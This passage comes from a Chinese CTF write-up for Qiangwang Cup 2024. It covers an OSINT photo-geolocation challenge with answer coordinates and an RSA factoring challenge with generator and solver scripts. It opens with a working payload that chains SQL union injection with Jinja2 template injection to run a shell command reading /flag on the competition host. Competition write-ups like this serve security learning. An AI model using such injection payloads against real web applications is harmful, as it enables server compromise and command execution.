</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://eci-2ze762llzxw5o9w9mbw2.cloudeci1.ichunqiu.com:5000/snake_win?username=1&#39; union select 1,2,&#34;{{lipsum.__globals__.__builtins__.eval(&#39;__import__(\&#39;os\&#39;).popen(\&#39;tac /flag\&#39;).read()&#39;)}}&#34;-- -
</span></span></code></pre></td></tr></table></div></div><h2 id=master-of-osint>Master of OSINT</h2><p>进来之后发现是个找图片</p><p>使用工具慢慢she出经纬度</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://api.map.baidu.com/lbsapi/getpoint/index.html
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>https://map.baidu.com/search/
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/qiangwang-cup-2024/QQ20241103-134528.png width=1216 height=490 loading=lazy alt=1></p><p>看到有湖并且这里很平，打开地图，国内有湖的地方就这两个</p><p><img src=/p/qiangwang-cup-2024/QQ20241103-134727.png width=860 height=673 loading=lazy alt=1></p><p>挨着试找到是海南藏族自治州这里</p><p><img src=/p/qiangwang-cup-2024/QQ20241103-180630.png width=1625 height=702 loading=lazy alt=1></p><p>百安居(这里注意要下载，不然看不到这个)</p><p><img src=/p/qiangwang-cup-2024/QQ20241103-150334.png width=1454 height=601 loading=lazy alt=1></p><p>第三张图的话就很熟悉了，因为我在成都，这是双流机场</p><p><img src=/p/qiangwang-cup-2024/QQ20241103-150654.png width=1236 height=686 loading=lazy alt=1></p><p>这里一个大卡车重汽(找物流公司)</p><p><img src=/p/qiangwang-cup-2024/QQ20241103-150923.png width=948 height=453 loading=lazy alt=1></p><p>这不是一模一样？</p><p><img src=/p/qiangwang-cup-2024/QQ20241103-151627.png width=1734 height=879 loading=lazy alt=1></p><p>这一看就是重庆继续找找这个高架</p><p><img src=/p/qiangwang-cup-2024/QQ20241103-151900.png width=1076 height=670 loading=lazy alt=1></p><p>简直了</p><p><img src=/p/qiangwang-cup-2024/QQ20241103-152134.png width=1554 height=823 loading=lazy alt=1></p><p>还是高架，每个图都在高架上面基本是</p><p><img src=/p/qiangwang-cup-2024/QQ20241103-152633.png width=1221 height=729 loading=lazy alt=1></p><p><img src=/p/qiangwang-cup-2024/QQ20241103-152707.png width=1371 height=654 loading=lazy alt=1></p><p>这个好搞，橘子洲</p><p><img src=/p/qiangwang-cup-2024/QQ20241103-152844.png width=1347 height=549 loading=lazy alt=1></p><p><img src=/p/qiangwang-cup-2024/QQ20241103-154417.png width=1695 height=801 loading=lazy alt=1></p><p>这个我都不用看，长江大桥</p><p><img src=/p/qiangwang-cup-2024/QQ20241103-154457.png width=1778 height=865 loading=lazy alt=1></p><p><img src=/p/qiangwang-cup-2024/QQ20241103-154642.png width=1518 height=646 loading=lazy alt=1></p><p>ok终于是找完了，最后经过两年半的查找答案如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>一 99.974383,36.66725
</span></span><span class=line><span class=cl>二 121.567039,31.211279
</span></span><span class=line><span class=cl>三 103.966657,30.571185
</span></span><span class=line><span class=cl>四 120.293197,30.346334
</span></span><span class=line><span class=cl>五 106.524114,29.52509
</span></span><span class=line><span class=cl>六 118.783635,32.013335
</span></span><span class=line><span class=cl>七 112.969521,28.201853
</span></span><span class=line><span class=cl>八 121.734859,31.412815
</span></span><span class=line><span class=cl>九 114.412567,30.661017
</span></span><span class=line><span class=cl>十 120.308631,30.152785
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/qiangwang-cup-2024/QQ20241103-012118.png width=1274 height=787 loading=lazy alt=1></p><h2 id=easyrsa>EasyRSA</h2><p>先进去拿参数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>N=42904039314199895721696616855758464218776719155277644688156355421669731926586744657558904856662524664815001053906568694877941070734379088087661446033173083187445772619113110948584643982194462341444480231060053008290646295405517083378534377980681311369011669792894523149142258780642722178595904015146283411763379803572408919306199860289071979553687419537458952652653841956474558202437419097277523814620107550505762949933586019973892299407282425426574324269936979456148685237646197700304901043932950332167503114720687804083313706537708157799145007429182143131211123753832870983386421744654743615691456503687433253700707
</span></span><span class=line><span class=cl>e=65537
</span></span><span class=line><span class=cl>g=2467289273249224073499308128504701193779913828213444430435151093961964204649293591016042690390824880024231535639632722916163130665022776513946276332507
</span></span><span class=line><span class=cl>enc=12709693287264155874588327905007095658924584817796376099734882542910731460825766770672115564368497141711860077407627137628906166192867282903038794375385103923117937259213778979889844254053587067543343272153487237062941786040827781296627252935285712565966813858306852382594194367821015639439066528157046594978868346586874763813295540162505405425455235498583512373062022633584465000726414162171619788788030500551923136766813781433302278483256483999391289749744953431408447702944986393707616176873212339507135665819552507676368414131287311936039623896380645989109820457591105147343119080909601863364535862069112518457752
</span></span></code></pre></td></tr></table></div></div><p>这靶机我之前一直没看到我丢，然后就不用管靶机了，其次不要关靶机，我关了靶机导致一直跑不出来</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#encoding:utf-8</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>long_to_bytes</span><span class=p>,</span> <span class=n>bytes_to_long</span><span class=p>,</span> <span class=n>getPrime</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span><span class=o>,</span> <span class=nn>gmpy2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>RSAEncryptor</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>g</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>a</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>b</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>e</span> <span class=o>=</span> <span class=mi>65537</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>factorGen</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>product</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>factorGen</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>g</span> <span class=o>=</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>500</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=ow>not</span> <span class=n>gmpy2</span><span class=o>.</span><span class=n>is_prime</span><span class=p>(</span><span class=mi>2</span><span class=o>*</span><span class=bp>self</span><span class=o>.</span><span class=n>g</span><span class=o>*</span><span class=bp>self</span><span class=o>.</span><span class=n>a</span><span class=o>+</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>a</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>523</span><span class=p>,</span> <span class=mi>2</span><span class=o>**</span><span class=mi>524</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=ow>not</span> <span class=n>gmpy2</span><span class=o>.</span><span class=n>is_prime</span><span class=p>(</span><span class=mi>2</span><span class=o>*</span><span class=bp>self</span><span class=o>.</span><span class=n>g</span><span class=o>*</span><span class=bp>self</span><span class=o>.</span><span class=n>b</span><span class=o>+</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>b</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>523</span><span class=p>,</span> <span class=mi>2</span><span class=o>**</span><span class=mi>524</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>h</span> <span class=o>=</span> <span class=mi>2</span><span class=o>*</span><span class=bp>self</span><span class=o>.</span><span class=n>g</span><span class=o>*</span><span class=bp>self</span><span class=o>.</span><span class=n>a</span><span class=o>*</span><span class=bp>self</span><span class=o>.</span><span class=n>b</span><span class=o>+</span><span class=bp>self</span><span class=o>.</span><span class=n>a</span><span class=o>+</span><span class=bp>self</span><span class=o>.</span><span class=n>b</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>gmpy2</span><span class=o>.</span><span class=n>is_prime</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>h</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>N</span> <span class=o>=</span> <span class=mi>2</span><span class=o>*</span><span class=bp>self</span><span class=o>.</span><span class=n>h</span><span class=o>*</span><span class=bp>self</span><span class=o>.</span><span class=n>g</span><span class=o>+</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=nb>bin</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>N</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>encrypt</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>msg</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gmpy2</span><span class=o>.</span><span class=n>powmod</span><span class=p>(</span><span class=n>msg</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>e</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>N</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>product</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;/flag&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>flag</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=c1># Convert flag to an integer before encryption</span>
</span></span><span class=line><span class=cl>        <span class=n>flag_int</span> <span class=o>=</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>enc</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>flag_int</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>show</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;enc=</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>enc</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;N=</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>N</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;e=</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;g=</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>g</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>RSAEncryptor</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><ol><li><strong>生成素数和模数 (<code>N</code>)</strong>:<ul><li><code>self.g</code> 是一个500位的素数。</li><li><code>self.a</code> 和 <code>self.b</code> 是随机生成的数，它们使得 <code>2*self.g*self.a+1</code> 和 <code>2*self.g*self.b+1</code> 是素数。</li><li><code>self.h</code> 是 <code>2*self.g*self.a*self.b+self.a+self.b</code>，且 <code>self.h</code> 也是素数。</li><li><code>N</code> 被计算为 <code>2*self.h*self.g+1</code>。</li></ul></li><li><strong>加密过程</strong>:<ul><li>使用公钥 <code>(N, e)</code>，其中 <code>e</code> 是常用的 <code>65537</code>。</li><li>消息用 <code>gmpy2.powmod(msg, e, N)</code> 进行加密。</li></ul></li><li><strong>解密的挑战</strong>:<ul><li>通常，RSA解密需要私钥 <code>(d)</code>，它通过求解 <code>ed ≡ 1 (mod φ(N))</code> 获得。这里 <code>φ(N)</code> 是欧拉函数，通常是 <code>(p-1)(q-1)</code>，<code>p</code> 和 <code>q</code> 是 <code>N</code> 的两个素数因子。</li></ul></li></ol><p>解密的话我们</p><ol><li><strong>模数分解 (Factorization)</strong>:<ul><li>目标是将大整数模数 N<em>N</em> 分解为两个素数乘积 p<em>p</em> 和 q<em>q</em>。在此方案中，利用已知的结构 p=2ga+1<em>p</em>=2<em>g**a</em>+1 和 q=2gb+1<em>q</em>=2<em>g**b</em>+1 进行推导。</li></ul></li><li><strong>中国剩余定理 (Chinese Remainder Theorem, CRT)</strong>:<ul><li>使用求解 <code>u</code> 和 <code>v</code> 的过程，间接利用了模数分解的结构特性，通过推导近似根来简化计算过程。</li></ul></li><li><strong>指数求逆 (Modular Inversion)</strong>:<ul><li>计算私钥指数 d<em>d</em> 的过程利用了模逆运算。具体来说，通过求解 d≡e−1(modϕ(N))<em>d</em>≡<em>e</em>−1(mod<em>ϕ</em>(<em>N</em>))，其中 ϕ(N)=(p−1)(q−1)<em>ϕ</em>(<em>N</em>)=(<em>p</em>−1)(<em>q</em>−1)。</li></ul></li><li><strong>密文解密 (Ciphertext Decryption)</strong>:<ul><li>使用模幂运算实现解密，即 m=Cd(modN)<em>m</em>=<em>C**d</em>(mod<em>N</em>)。</li></ul></li><li><strong>平方根逼近 (Root Approximation)</strong>:<ul><li>通过 <code>iroot</code> 函数计算平方根，利用近似和迭代方法逼近解。</li></ul></li><li><strong>数论攻击 (Number Theory Attack)</strong>:<ul><li>整个解密方案可以视为基于数论特性的攻击，通过已知因子关系和结构性弱点来恢复加密密钥。</li></ul></li></ol><p>最后写个脚本，此时一定要注意，把<code>r</code>和<code>s</code>写大一点节省时间不然靶机都没了可能还是跑不出来</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#encoding:utf-8</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>bytes_to_long</span><span class=p>,</span> <span class=n>long_to_bytes</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>gmpy2</span> <span class=kn>import</span> <span class=n>mpz</span><span class=p>,</span> <span class=n>iroot</span><span class=p>,</span> <span class=n>powmod</span><span class=p>,</span> <span class=n>invert</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># N = pq 2050bit; p 1025 bit; q 1025 bit</span>
</span></span><span class=line><span class=cl><span class=n>N</span><span class=o>=</span><span class=n>mpz</span><span class=p>(</span><span class=s2>&#34;36485011506081204249353320553950613538202089151659637848115802055074144483670941532556535766902145921973594997027479624905209949691271762025427477743585502482131332590436695347051791231697483166685773359997599962390951389807897889989842749391578113929807413080535375105955893148740093617956725535911664750114893144869800480780770094530308687537645720410428791977178530996923717038507261474355948618508166751918076068001409953063336528028033025761084181080126504217426369672569710112079242859636376145175734678264411553576130988579634184334371125938410224579198183934903162942790258446634362761502507649065084540399627&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># g 500bit; is p-1 and q-1 prime factor</span>
</span></span><span class=line><span class=cl><span class=c1># p = 2*g*a + 1; q = 2*g*b + 1</span>
</span></span><span class=line><span class=cl><span class=n>g</span><span class=o>=</span><span class=n>mpz</span><span class=p>(</span><span class=s2>&#34;2247113742037388549126827263530967729647876171160434451719365936820171519384453150516592428020693798355300913115889019295485975565435074105418185872653&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>e</span> <span class=o>=</span> <span class=mi>65537</span>
</span></span><span class=line><span class=cl><span class=n>C</span><span class=o>=</span><span class=n>mpz</span><span class=p>(</span><span class=s2>&#34;8723174185243286745778722165394947826680341325024406927179799187651216273269550886122199189840469819205011474538291123038948795537734295353538048662643560558613222940652432465387821767869659987332731872376334835470075829738040916495874122194399361612840158429781298635579378738659475708516663189740417547967046498681970164226439603650301067936899183776866269511992054665324683444422921359125980570625643493195848148074925368422310976126635090617900612294394294526142884055556163913650939907516297466755311082324437407938032687938659279120158022331434516948954703962993479193049714934370005556711772066538439821538739&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># Calculate h, u, and v</span>
</span></span><span class=line><span class=cl><span class=n>h</span> <span class=o>=</span> <span class=p>(</span><span class=n>N</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>//</span> <span class=n>g</span>
</span></span><span class=line><span class=cl><span class=n>u</span> <span class=o>=</span> <span class=n>h</span> <span class=o>//</span> <span class=n>g</span>
</span></span><span class=line><span class=cl><span class=n>v</span> <span class=o>=</span> <span class=n>h</span> <span class=o>%</span> <span class=n>g</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>Solve_c</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=c1># Calculate approximate square root of N</span>
</span></span><span class=line><span class=cl>    <span class=n>sqrt_N</span> <span class=o>=</span> <span class=n>iroot</span><span class=p>(</span><span class=n>mpz</span><span class=p>(</span><span class=n>N</span><span class=p>),</span> <span class=mi>2</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>C_approx</span> <span class=o>=</span> <span class=n>sqrt_N</span> <span class=o>//</span> <span class=p>(</span><span class=n>g</span> <span class=o>*</span> <span class=n>g</span><span class=p>)</span>  <span class=c1># 确保结果为整数</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=n>powmod</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>g</span><span class=p>,</span> <span class=n>N</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Loop over possible values of C</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=nb>int</span><span class=p>(</span><span class=n>C_approx</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span><span class=p>):</span>  <span class=c1># 使用 int() 将 C_approx 转换为整数</span>
</span></span><span class=line><span class=cl>        <span class=n>D</span> <span class=o>=</span> <span class=p>(</span><span class=n>iroot</span><span class=p>(</span><span class=n>C_approx</span><span class=p>,</span> <span class=mi>2</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>        <span class=n>final</span> <span class=o>=</span> <span class=n>powmod</span><span class=p>(</span><span class=n>b</span><span class=p>,</span> <span class=n>u</span><span class=p>,</span> <span class=n>N</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>r</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>5100</span><span class=p>,</span><span class=nb>int</span><span class=p>(</span><span class=n>D</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Checking r*D for i=</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=n>r</span> <span class=o>*</span> <span class=n>D</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>s</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4000</span><span class=p>,</span><span class=nb>int</span><span class=p>(</span><span class=n>D</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>powmod</span><span class=p>(</span><span class=n>b</span><span class=p>,</span> <span class=n>r</span> <span class=o>*</span> <span class=n>D</span> <span class=o>+</span> <span class=n>s</span><span class=p>,</span> <span class=n>N</span><span class=p>)</span> <span class=o>==</span> <span class=n>final</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Solution found: r =&#34;</span><span class=p>,</span> <span class=n>r</span><span class=p>,</span> <span class=s2>&#34;s =&#34;</span><span class=p>,</span> <span class=n>s</span><span class=p>,</span> <span class=s2>&#34;i =&#34;</span><span class=p>,</span> <span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=n>r</span> <span class=o>*</span> <span class=n>D</span> <span class=o>+</span> <span class=n>s</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Get the value of c</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=n>Solve_c</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;c:&#34;</span><span class=p>,</span> <span class=n>c</span><span class=p>)</span>  <span class=c1># Expected output: c = 51589121</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Calculate A and B for quadratic equation</span>
</span></span><span class=line><span class=cl><span class=n>A</span> <span class=o>=</span> <span class=n>u</span> <span class=o>-</span> <span class=n>c</span>  <span class=c1># x * y = u - c</span>
</span></span><span class=line><span class=cl><span class=n>B</span> <span class=o>=</span> <span class=n>v</span> <span class=o>+</span> <span class=n>c</span> <span class=o>*</span> <span class=n>g</span>  <span class=c1># x + y = v + c * g</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Calculate the values of x and y using the quadratic formula</span>
</span></span><span class=line><span class=cl><span class=n>delta</span> <span class=o>=</span> <span class=n>iroot</span><span class=p>(</span><span class=n>B</span> <span class=o>*</span> <span class=n>B</span> <span class=o>-</span> <span class=mi>4</span> <span class=o>*</span> <span class=n>A</span><span class=p>,</span> <span class=mi>2</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>x</span> <span class=o>=</span> <span class=p>(</span><span class=n>B</span> <span class=o>+</span> <span class=n>delta</span><span class=p>)</span> <span class=o>//</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>y</span> <span class=o>=</span> <span class=p>(</span><span class=n>B</span> <span class=o>-</span> <span class=n>delta</span><span class=p>)</span> <span class=o>//</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>a</span> <span class=o>=</span> <span class=n>x</span> <span class=o>//</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=o>=</span> <span class=n>y</span> <span class=o>//</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Calculate p and q</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>g</span> <span class=o>*</span> <span class=n>a</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>q</span> <span class=o>=</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>g</span> <span class=o>*</span> <span class=n>b</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Calculate private key exponent d</span>
</span></span><span class=line><span class=cl><span class=n>d</span> <span class=o>=</span> <span class=n>invert</span><span class=p>(</span><span class=n>e</span><span class=p>,</span> <span class=p>(</span><span class=n>p</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=p>(</span><span class=n>q</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Decrypt the ciphertext</span>
</span></span><span class=line><span class=cl><span class=n>m</span> <span class=o>=</span> <span class=n>powmod</span><span class=p>(</span><span class=n>C</span><span class=p>,</span> <span class=n>d</span><span class=p>,</span> <span class=n>N</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Decrypted message:&#34;</span><span class=p>,</span> <span class=n>long_to_bytes</span><span class=p>(</span><span class=n>m</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=apbq>apbq</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
